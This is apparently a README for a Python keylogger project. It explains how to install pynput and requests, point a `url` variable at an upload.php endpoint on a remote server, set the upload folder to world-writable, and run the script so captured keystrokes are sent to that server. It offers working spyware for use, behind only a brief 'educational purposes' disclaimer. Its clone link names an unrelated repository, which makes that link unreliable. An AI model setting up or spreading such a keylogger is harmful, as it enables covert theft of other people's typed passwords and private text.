# Auto Keylogger with Automatic File Upload

This repository contains a Python keylogger that captures keystrokes and automatically uploads the log file to a remote PHP server. The project includes a Python script and a compressed folder (`datas.zip`) that contains the website files needed to handle and store file uploads.

---

## Repository Structure

```
.
├── keylogger.py         # Python script for keylogging and automatic file upload.
├── datas.zip            # Compressed folder containing website files:
│   ├── index.html       # Webpage with file upload form.
│   ├── upload.php       # PHP script to handle file uploads.
│   └── uploads/         # Directory where uploaded files will be stored.
└── README.md            # This file.
```

---

## Prerequisites

### Python Environment
- **Python 3.x** is required.
- Required libraries:
  - `pynput`
  - `requests`

Install them using:
```bash
pip install pynput requests
```

To clone the repository:
```bash
git clone https://github.com/ChetanyaGarg/Password_Checker.git
```

### PHP Server Environment
- A web server with PHP support (e.g., **XAMPP**, **WAMP**, **LAMP**).
- Ensure that the `uploads/` folder (inside the unzipped `datas` folder) is writable (on Linux, you might use `chmod 777 uploads`).

---

## Setup Instructions

### 1. Configure the Python Keylogger

1. Open the `keylogger.py` file in your editor.
2. Find the URL configuration section:
   ```python
   # NOTE: You only need to change the 'url' variable to match your server's IP address.
   url = "http://YOUR_SERVER_IP/datas/upload.php"
   ```
3. Replace `YOUR_SERVER_IP` with your server's IP address or domain.
4. Save the changes.

### 2. Set Up the PHP Server

1. **Unzip Website Files:**
   - Extract `datas.zip` into your server’s web directory (e.g., `htdocs` in XAMPP).
   - This creates a `datas` folder containing:
     - `index.html`
     - `upload.php`
     - `uploads/` folder

2. **Adjust Permissions:**
   - Ensure the `uploads/` directory is writable. For Linux:
     ```bash
     chmod 777 /path-to-your-web-root/datas/uploads
     ```

3. **Test Your Server:**
   - Navigate to `http://YOUR_SERVER_IP/datas/index.html` in your browser.
   - Use the file input to select a text file and submit. The file should be processed by `upload.php` and saved in the `uploads/` folder.

---

## Running the Project

1. **Start the Python Keylogger:**
   ```bash
   python keylogger.py
   ```
   - The script logs keystrokes to `log.txt`.
   - When the **ESC** key is pressed, logging stops and `log.txt` is automatically uploaded to your server.

2. **Verify the Upload:**
   - Check the terminal output for the server response.
   - Confirm that the uploaded `log.txt` appears in the `uploads/` folder on your server.

---

## Troubleshooting

- **Upload Failures:**
  - Ensure that the `url` in `keylogger.py` correctly points to your server (only the IP address needs to be updated).
  - Verify that your server is running and accessible.
  - Confirm that the `uploads/` folder inside the `datas` directory has the proper write permissions.

- **Python Errors:**
  - Make sure all required libraries (`pynput`, `requests`) are installed.
  - Check terminal output for error messages and adjust your configuration if needed.

---

## Important Notes

- **Security Notice:**  
  This keylogger is intended for educational purposes only. Always ensure you have the proper permissions before deploying or using a keylogger.

- **Configuration Summary:**  
  **The only change you need to make is updating the server IP in the `keylogger.py` file.** No other modifications should be necessary for the setup.

---

## **License**
This project is licensed under the **MIT License**. You are free to use, modify, and distribute it.

Happy coding and stay responsible!

---
